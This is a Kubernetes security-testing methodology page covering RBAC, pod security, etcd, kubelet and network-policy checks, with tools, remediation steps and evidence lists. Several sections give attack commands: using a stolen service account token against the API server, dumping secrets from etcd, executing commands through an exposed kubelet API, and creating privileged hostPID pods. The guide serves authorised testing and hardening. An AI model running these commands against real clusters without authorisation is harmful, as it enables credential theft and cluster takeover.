# Kubernetes Security Testing

## Overview
Kubernetes security testing identifies misconfigurations and vulnerabilities in cluster components including RBAC policies, pod security settings, service account tokens, etcd data stores, kubelet APIs, and admission controllers. Compromising Kubernetes can grant attackers control over all containerized workloads, secrets, and potentially the underlying infrastructure.

## Classification
- **CWE:** CWE-269 (Improper Privilege Management), CWE-284 (Improper Access Control), CWE-250 (Execution with Unnecessary Privileges)
- **OWASP:** A01:2021 - Broken Access Control, A05:2021 - Security Misconfiguration
- **CVSS Base:** 7.0 - 10.0 (Critical for cluster compromise)
- **MITRE ATT&CK:** T1609 (Container Administration Command), T1610 (Deploy Container), T1611 (Escape to Host), T1613 (Container and Resource Discovery)

## Detection Methodology

### 1. RBAC Misconfiguration Analysis
```bash
# List all cluster roles and role bindings
kubectl get clusterroles -o wide
kubectl get clusterrolebindings -o wide
kubectl get roles --all-namespaces -o wide
kubectl get rolebindings --all-namespaces -o wide

# Find overly permissive roles (wildcard access)
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]? | select(.resources[]? == "*" and .verbs[]? == "*")) | .metadata.name'

# Check what current user/SA can do
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>

# Check specific permissions
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create clusterrolebindings

# Find all subjects with cluster-admin
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'

# Find service accounts with excessive permissions
kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | \
  jq '.items[] | select(.subjects[]?.kind=="ServiceAccount") | {binding:.metadata.name, role:.roleRef.name, sa:.subjects[]}'
```

### 2. Pod Security Assessment
```bash
# Find privileged pods
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata | {ns:.namespace, name:.name}'

# Find pods running as root
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.runAsUser==0 or .spec.securityContext.runAsUser==0) | .metadata | {ns:.namespace, name:.name}'

# Find pods with hostPID, hostNetwork, or hostIPC
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.hostPID==true or .spec.hostNetwork==true or .spec.hostIPC==true) | {ns:.metadata.namespace, name:.metadata.name, hostPID:.spec.hostPID, hostNet:.spec.hostNetwork, hostIPC:.spec.hostIPC}'

# Find pods with hostPath volumes
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.volumes[]?.hostPath != null) | {ns:.metadata.namespace, name:.metadata.name, paths:[.spec.volumes[] | select(.hostPath) | .hostPath.path]}'

# Check Pod Security Standards enforcement
kubectl get ns --show-labels | grep pod-security

# Find pods without resource limits
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[] | .resources.limits == null) | .metadata | {ns:.namespace, name:.name}'
```

### 3. Service Account Token Exploitation
```bash
# From inside a compromised pod — locate service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Set up kubectl with stolen token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Test API access with the token
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# Check what this service account can do
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets","namespace":"*"}}}'

# List secrets accessible to the service account
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# Check for automounted tokens (should be disabled for non-essential pods)
kubectl get serviceaccounts --all-namespaces -o json | \
  jq '.items[] | select(.automountServiceAccountToken != false) | {ns:.metadata.namespace, name:.metadata.name}'
```

### 4. etcd Access and Exploitation
```bash
# Check if etcd is exposed
nmap -p 2379,2380 <target>

# Check for unauthenticated etcd access
etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only

# If authenticated, use client certificates
etcdctl --endpoints=https://<target>:2379 \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  get / --prefix --keys-only

# Extract secrets from etcd (stored base64 encoded)
etcdctl --endpoints=https://<target>:2379 \
  --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
  get /registry/secrets --prefix

# Check etcd member list
etcdctl --endpoints=https://<target>:2379 member list
```

### 5. Kubelet API Exploitation
```bash
# Check if kubelet API is exposed (port 10250 authenticated, 10255 read-only)
curl -sk https://<node>:10250/pods
curl http://<node>:10255/pods

# If kubelet allows anonymous auth, execute commands in pods
curl -sk https://<node>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=id"

# List running pods on a node
curl -sk https://<node>:10250/runningpods/

# Check kubelet configuration
curl -sk https://<node>:10250/configz

# Execute command via kubelet
curl -sk -XPOST "https://<node>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

### 6. Admission Controller Bypass
```bash
# Check which admission controllers are enabled
kubectl api-versions
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Test if PodSecurityPolicy/PodSecurity is enforced
kubectl run test --image=alpine --restart=Never --overrides='{
  "spec":{"containers":[{
    "name":"test","image":"alpine","command":["sleep","3600"],
    "securityContext":{"privileged":true}
  }]}
}'

# Check if OPA/Gatekeeper constraints exist
kubectl get constraints
kubectl get constrainttemplates

# Test creating a pod that violates policy
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: bypass-test
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: test
    image: alpine
    securityContext:
      privileged: true
EOF
```

### 7. Network Policy Assessment
```bash
# Check if network policies exist
kubectl get networkpolicies --all-namespaces

# Find namespaces without network policies
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l)
  if [ "$count" -eq "0" ]; then
    echo "No NetworkPolicy: $ns"
  fi
done

# Test pod-to-pod connectivity (should be restricted)
kubectl exec <pod-a> -- wget -qO- http://<pod-b-service>.<namespace>.svc.cluster.local
```

## Tool Usage

### kube-bench (CIS Benchmark)
```bash
# Run CIS Kubernetes Benchmark
kube-bench run --targets master
kube-bench run --targets node
kube-bench run --targets etcd

# JSON output for parsing
kube-bench run --json --outputfile results.json
```

### kube-hunter
```bash
# Remote scan
kube-hunter --remote <target>

# From within the cluster
kubectl run kube-hunter --image=aquasec/kube-hunter --restart=Never \
  --command -- kube-hunter --pod

# Active hunting mode (attempts exploitation)
kube-hunter --remote <target> --active
```

### kubeaudit
```bash
# Audit all resources
kubeaudit all

# Specific checks
kubeaudit privileged
kubeaudit rootfs
kubeaudit nonroot
kubeaudit caps
kubeaudit automountServiceAccountToken
```

### Peirates (Post-Exploitation)
```bash
# From inside a pod
./peirates
# Menu-driven tool for:
# - Service account token theft
# - Secret enumeration
# - Pod creation for escape
# - Cloud credential harvesting
```

## Remediation
1. **RBAC:** Apply least-privilege roles, avoid cluster-admin for workloads, use namespace-scoped roles instead of cluster roles, audit role bindings regularly
2. **Pod security:** Enforce Pod Security Standards (Restricted profile), drop all capabilities, run as non-root, use read-only root filesystems, disable automountServiceAccountToken on non-essential pods
3. **etcd:** Enable TLS client authentication, restrict network access to etcd, encrypt secrets at rest, back up etcd with encryption
4. **Kubelet:** Disable anonymous authentication, set authorization mode to Webhook, disable read-only port (10255), rotate kubelet certificates
5. **Network policies:** Implement default-deny network policies per namespace, explicitly allow only required traffic, use a CNI plugin that supports NetworkPolicy
6. **Admission controllers:** Enable PodSecurity admission, deploy OPA Gatekeeper or Kyverno for custom policies, use ValidatingAdmissionWebhooks to enforce security requirements

## Evidence Collection
- RBAC role definitions showing wildcard or excessive permissions
- Pod specifications with privileged mode, hostPID, or hostPath volumes
- Service account tokens extracted from pods with their assessed permissions
- etcd access output showing readable secrets
- Kubelet API responses showing command execution capability
- kube-bench report with failed CIS benchmark checks
- Network policy gaps showing unrestricted inter-namespace communication
- Admission controller bypass proof showing policy-violating pod creation
